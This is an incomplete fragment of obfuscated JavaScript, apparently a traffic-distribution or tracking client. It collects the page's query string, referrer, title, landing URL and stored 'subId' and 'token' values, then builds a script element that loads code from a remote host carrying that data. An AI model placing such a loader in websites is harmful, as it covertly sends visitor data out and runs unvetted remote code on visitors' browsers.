...
(function (global, factory) {
  var name = '_Y5D6S3Hqy8vQn86V';
    if (!window._Y5D6S3Hqy8vQn86V) {
    ...
    if (typeof _d7GCCRnr73x1F4kd !== 'undefined' && _d7GCCRnr73x1F4kd !== null) {
        var _h2N4kVFGxnXNkdq7 = JSON.parse(_d7GCCRnr73x1F4kd);
        var _cFsFDgp3BbzMkB7y = Math.round(+new Date()/1000);
        if (_h2N4kVFGxnXNkdq7.created_at + window._Y5D6S3Hqy8vQn86V.ttl < _cFsFDgp3BbzMkB7y) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _tSQZBnMGpfxWR5xz = localStorage.getItem('subId');
    var _96h9jDxw512hrMXR = localStorage.getItem('token');
    var _7kZL13Wv4tF7TL2Y = '?return=js.client';
        _7kZL13Wv4tF7TL2Y += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _7kZL13Wv4tF7TL2Y += '&se_referrer=' + encodeURIComponent(document.referrer);
        _7kZL13Wv4tF7TL2Y += '&default_keyword=' + encodeURIComponent(document.title);
        _7kZL13Wv4tF7TL2Y += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _7kZL13Wv4tF7TL2Y += '&name=' + encodeURIComponent(name);
        _7kZL13Wv4tF7TL2Y += '&host=' + encodeURIComponent(window._Y5D6S3Hqy8vQn86V.R_PATH);
    if (typeof _tSQZBnMGpfxWR5xz !== 'undefined' && _tSQZBnMGpfxWR5xz && window._Y5D6S3Hqy8vQn86V.unique) {
        _7kZL13Wv4tF7TL2Y += '&sub_id=' + encodeURIComponent(_tSQZBnMGpfxWR5xz);
    }
    if (typeof _96h9jDxw512hrMXR !== 'undefined' && _96h9jDxw512hrMXR && window._Y5D6S3Hqy8vQn86V.unique) {
        _7kZL13Wv4tF7TL2Y += '&token=' + encodeURIComponent(_96h9jDxw512hrMXR);
    }
    if ('' !== '') {
        _7kZL13Wv4tF7TL2Y += '&bypass_cache=';
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._Y5D6S3Hqy8vQn86V.R_PATH + _7kZL13Wv4tF7TL2Y;
